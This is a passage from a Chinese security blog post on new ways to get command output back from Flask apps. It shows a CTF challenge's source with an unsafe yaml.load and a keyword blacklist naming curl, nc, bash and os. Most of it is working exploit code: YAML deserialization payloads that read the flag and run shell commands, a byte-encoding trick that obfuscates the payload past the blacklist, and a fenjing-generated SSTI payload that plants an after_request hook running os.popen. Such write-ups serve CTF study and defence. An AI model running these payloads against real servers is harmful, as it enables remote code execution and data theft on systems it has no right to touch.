+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">input_str</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    blacklist_terms = &#123;<span class="string">&#x27;apply&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;setstate&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;command&#x27;</span>,<span class="string">&#x27;static&#x27;</span>,<span class="string">&#x27;templates&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span></span><br><span class="line">                       <span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;ntimeit&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;before_request&#x27;</span>, <span class="string">&#x27;after_request&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;error_handler&#x27;</span>, <span class="string">&#x27;add_url_rule&#x27;</span>,<span class="string">&#x27;teardown_request&#x27;</span>,<span class="string">&#x27;teardown_appcontext&#x27;</span>,<span class="string">&#x27;\\u&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>,<span class="string">&#x27;join&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    input_str_lower = <span class="built_in">str</span>(input_str).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> blacklist_terms:</span><br><span class="line">        <span class="keyword">if</span> term <span class="keyword">in</span> input_str_lower:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found blacklisted term: <span class="subst">&#123;term&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.*\.yaml$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_yaml_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(file_pattern.<span class="keyword">match</span>(filename))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to DASCTF X 0psu3</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uploaded_file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> uploaded_file <span class="keyword">and</span> is_yaml_file(uploaded_file.filename):</span><br><span class="line">                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)</span><br><span class="line">                uploaded_file.save(file_path)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;uploaded successfully&quot;</span>&#125;), <span class="number">200</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Just YAML file&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Yam1&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Yam1</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;uploads/<span class="subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_content = f.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> waf(file_content):</span><br><span class="line">            test = yaml.load(file_content)</span><br><span class="line">            <span class="built_in">print</span>(test)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;welcome&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
+
+<p>open读文件，然后直接污染<code>server_version</code></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.buuoj.cn:29936/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;&quot;&quot;!!python/object/new:type</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">     - exp</span></span><br><span class="line"><span class="string">     - !!python/tuple []</span></span><br><span class="line"><span class="string">     - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span></span><br><span class="line"><span class="string">    listitems: |</span></span><br><span class="line"><span class="string">     bb=open(&quot;/flag&quot;).read()</span></span><br><span class="line"><span class="string">     import werkzeug</span></span><br><span class="line"><span class="string">     setattr(werkzeug.serving.WSGIRequestHandler, &quot;server_version&quot;,bb )</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.yaml&#x27;</span>, content, <span class="string">&#x27;application/octet-stream&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url+<span class="string">&#x27;upload&#x27;</span>,  files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url+<span class="string">&#x27;Yam1?filename=1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321070.png" alt="image-20250124220247896"></p>
+<p>或者通过bytes绕过，rce读flag</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">&#x27;from werkzeug.serving import WSGIRequestHandler; import os; setattr(WSGIRequestHandler, &quot;sys_version&quot;, os.popen(\&#x27;cat /f*\&#x27;).read().strip())&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;exec(bytes([[j][0]for(i)in[range(<span class="subst">&#123;<span class="built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="string">&quot;]]or[&quot;</span>.join([<span class="string">f&quot;i]in[[<span class="subst">&#123;i&#125;</span>]]and[j]in[[<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(exp)]) + <span class="string">&quot;]]]))&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>exp</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.buuoj.cn:29936/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;&quot;&quot;!!python/object/new:type</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">     - exp</span></span><br><span class="line"><span class="string">     - !!python/tuple []</span></span><br><span class="line"><span class="string">     - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span></span><br><span class="line"><span class="string">    listitems: &quot;exec(bytes([[j][0]for(i)in[range(138)][0]for(j)in[range(256)][0]if[i]in[[0]]and[j]in[[102]]or[i]in[[1]]and[j]in[[114]]or[i]in[[2]]and[j]in[[111]]or[i]in[[3]]and[j]in[[109]]or[i]in[[4]]and[j]in[[32]]or[i]in[[5]]and[j]in[[119]]or[i]in[[6]]and[j]in[[101]]or[i]in[[7]]and[j]in[[114]]or[i]in[[8]]and[j]in[[107]]or[i]in[[9]]and[j]in[[122]]or[i]in[[10]]and[j]in[[101]]or[i]in[[11]]and[j]in[[117]]or[i]in[[12]]and[j]in[[103]]or[i]in[[13]]and[j]in[[46]]or[i]in[[14]]and[j]in[[115]]or[i]in[[15]]and[j]in[[101]]or[i]in[[16]]and[j]in[[114]]or[i]in[[17]]and[j]in[[118]]or[i]in[[18]]and[j]in[[105]]or[i]in[[19]]and[j]in[[110]]or[i]in[[20]]and[j]in[[103]]or[i]in[[21]]and[j]in[[32]]or[i]in[[22]]and[j]in[[105]]or[i]in[[23]]and[j]in[[109]]or[i]in[[24]]and[j]in[[112]]or[i]in[[25]]and[j]in[[111]]or[i]in[[26]]and[j]in[[114]]or[i]in[[27]]and[j]in[[116]]or[i]in[[28]]and[j]in[[32]]or[i]in[[29]]and[j]in[[87]]or[i]in[[30]]and[j]in[[83]]or[i]in[[31]]and[j]in[[71]]or[i]in[[32]]and[j]in[[73]]or[i]in[[33]]and[j]in[[82]]or[i]in[[34]]and[j]in[[101]]or[i]in[[35]]and[j]in[[113]]or[i]in[[36]]and[j]in[[117]]or[i]in[[37]]and[j]in[[101]]or[i]in[[38]]and[j]in[[115]]or[i]in[[39]]and[j]in[[116]]or[i]in[[40]]and[j]in[[72]]or[i]in[[41]]and[j]in[[97]]or[i]in[[42]]and[j]in[[110]]or[i]in[[43]]and[j]in[[100]]or[i]in[[44]]and[j]in[[108]]or[i]in[[45]]and[j]in[[101]]or[i]in[[46]]and[j]in[[114]]or[i]in[[47]]and[j]in[[59]]or[i]in[[48]]and[j]in[[32]]or[i]in[[49]]and[j]in[[105]]or[i]in[[50]]and[j]in[[109]]or[i]in[[51]]and[j]in[[112]]or[i]in[[52]]and[j]in[[111]]or[i]in[[53]]and[j]in[[114]]or[i]in[[54]]and[j]in[[116]]or[i]in[[55]]and[j]in[[32]]or[i]in[[56]]and[j]in[[111]]or[i]in[[57]]and[j]in[[115]]or[i]in[[58]]and[j]in[[59]]or[i]in[[59]]and[j]in[[32]]or[i]in[[60]]and[j]in[[115]]or[i]in[[61]]and[j]in[[101]]or[i]in[[62]]and[j]in[[116]]or[i]in[[63]]and[j]in[[97]]or[i]in[[64]]and[j]in[[116]]or[i]in[[65]]and[j]in[[116]]or[i]in[[66]]and[j]in[[114]]or[i]in[[67]]and[j]in[[40]]or[i]in[[68]]and[j]in[[87]]or[i]in[[69]]and[j]in[[83]]or[i]in[[70]]and[j]in[[71]]or[i]in[[71]]and[j]in[[73]]or[i]in[[72]]and[j]in[[82]]or[i]in[[73]]and[j]in[[101]]or[i]in[[74]]and[j]in[[113]]or[i]in[[75]]and[j]in[[117]]or[i]in[[76]]and[j]in[[101]]or[i]in[[77]]and[j]in[[115]]or[i]in[[78]]and[j]in[[116]]or[i]in[[79]]and[j]in[[72]]or[i]in[[80]]and[j]in[[97]]or[i]in[[81]]and[j]in[[110]]or[i]in[[82]]and[j]in[[100]]or[i]in[[83]]and[j]in[[108]]or[i]in[[84]]and[j]in[[101]]or[i]in[[85]]and[j]in[[114]]or[i]in[[86]]and[j]in[[44]]or[i]in[[87]]and[j]in[[32]]or[i]in[[88]]and[j]in[[34]]or[i]in[[89]]and[j]in[[115]]or[i]in[[90]]and[j]in[[121]]or[i]in[[91]]and[j]in[[115]]or[i]in[[92]]and[j]in[[95]]or[i]in[[93]]and[j]in[[118]]or[i]in[[94]]and[j]in[[101]]or[i]in[[95]]and[j]in[[114]]or[i]in[[96]]and[j]in[[115]]or[i]in[[97]]and[j]in[[105]]or[i]in[[98]]and[j]in[[111]]or[i]in[[99]]and[j]in[[110]]or[i]in[[100]]and[j]in[[34]]or[i]in[[101]]and[j]in[[44]]or[i]in[[102]]and[j]in[[32]]or[i]in[[103]]and[j]in[[111]]or[i]in[[104]]and[j]in[[115]]or[i]in[[105]]and[j]in[[46]]or[i]in[[106]]and[j]in[[112]]or[i]in[[107]]and[j]in[[111]]or[i]in[[108]]and[j]in[[112]]or[i]in[[109]]and[j]in[[101]]or[i]in[[110]]and[j]in[[110]]or[i]in[[111]]and[j]in[[40]]or[i]in[[112]]and[j]in[[39]]or[i]in[[113]]and[j]in[[99]]or[i]in[[114]]and[j]in[[97]]or[i]in[[115]]and[j]in[[116]]or[i]in[[116]]and[j]in[[32]]or[i]in[[117]]and[j]in[[47]]or[i]in[[118]]and[j]in[[102]]or[i]in[[119]]and[j]in[[42]]or[i]in[[120]]and[j]in[[39]]or[i]in[[121]]and[j]in[[41]]or[i]in[[122]]and[j]in[[46]]or[i]in[[123]]and[j]in[[114]]or[i]in[[124]]and[j]in[[101]]or[i]in[[125]]and[j]in[[97]]or[i]in[[126]]and[j]in[[100]]or[i]in[[127]]and[j]in[[40]]or[i]in[[128]]and[j]in[[41]]or[i]in[[129]]and[j]in[[46]]or[i]in[[130]]and[j]in[[115]]or[i]in[[131]]and[j]in[[116]]or[i]in[[132]]and[j]in[[114]]or[i]in[[133]]and[j]in[[105]]or[i]in[[134]]and[j]in[[112]]or[i]in[[135]]and[j]in[[40]]or[i]in[[136]]and[j]in[[41]]or[i]in[[137]]and[j]in[[41]]]))&quot;</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.yaml&#x27;</span>, content, <span class="string">&#x27;application/octet-stream&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url+<span class="string">&#x27;upload&#x27;</span>,  files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url+<span class="string">&#x27;Yam1?filename=1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321081.png" alt="image-20250124220639751"></p>
+<h1 id="污染-fenjing"><a href="#污染-fenjing" class="headerlink" title="污染+fenjing"></a>污染+fenjing</h1><p>还是回到SSTI，前面的SSTI Payload都是没有过滤的，既然我们已经构造出了<code>exec</code>可以执行的代码，那么就可以搭配fenjing写个绕过一把梭exp</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">    app.view_functions</span></span><br><span class="line"><span class="string">    for app in [__import__(&#x27;sys&#x27;).modules[&quot;__main__&quot;].app]</span></span><br><span class="line"><span class="string">    for request in [__import__(&#x27;sys&#x27;).modules[&quot;__main__&quot;].request]</span></span><br><span class="line"><span class="string">    if [</span></span><br><span class="line"><span class="string">        app.__dict__.update(&#123;&#x27;_got_first_request&#x27;: False&#125;),</span></span><br><span class="line"><span class="string">        app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">            lambda resp: exec(</span></span><br><span class="line"><span class="string">                r&quot;from werkzeug.serving import WSGIRequestHandler; import os; setattr(WSGIRequestHandler, &#x27;server_version&#x27;, os.popen(&#x27;whoami&#x27;).read().strip())&quot;</span></span><br><span class="line"><span class="string">            ) or resp</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27; &#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    full_payload_gen = fenjing.FullPayloadGen(waf)</span><br><span class="line">    exp, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.STRING, payload))</span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line">    r = requests.post(url=url, data=&#123;<span class="string">&quot;code&quot;</span>: exp&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.headers)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的黑名单是用的CISCN&amp;CCB的<code>Safe_Proxy</code>，本地搭一下直接打</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321149.png" alt="image-20250124225358565"></p>
+<p>成功污染。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> flask新回显方式</li>
+        <li><strong>Author:</strong> p0l1st</li>
+        <li><strong>Created at
+                :</strong> 2025-01-24 23:19:23</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-01-24 23:24:29
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://blog.p0l1st.top/2025/01/24/flask新回显方式/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/01/22/Java%E5%AE%89%E5%85%A8-Commons-Collections-3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Java安全-Commons-Collections 3利用链分析</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">flask新回显方式</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI"><span class="nav-text">SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-version"><span class="nav-text">server_version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys-version"><span class="nav-text">sys_version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http-protocol-version"><span class="nav-text">http protocol_version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8A%B6%E6%80%81%E7%A0%81"><span class="nav-text">状态码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#500%E9%A1%B5%E9%9D%A2"><span class="nav-text">500页面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#404%E9%A1%B5%E9%9D%A2"><span class="nav-text">404页面</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-version-1"><span class="nav-text">server_version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys-version-1"><span class="nav-text">sys_version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http-protocol-version-1"><span class="nav-text">http protocol_version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8A%B6%E6%80%81%E7%A0%81-1"><span class="nav-text">状态码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#500%E9%A1%B5%E9%9D%A2-1"><span class="nav-text">500页面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#404%E9%A1%B5%E9%9D%A2-1"><span class="nav-text">404页面</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Pickle反序列化</span></a></li><li 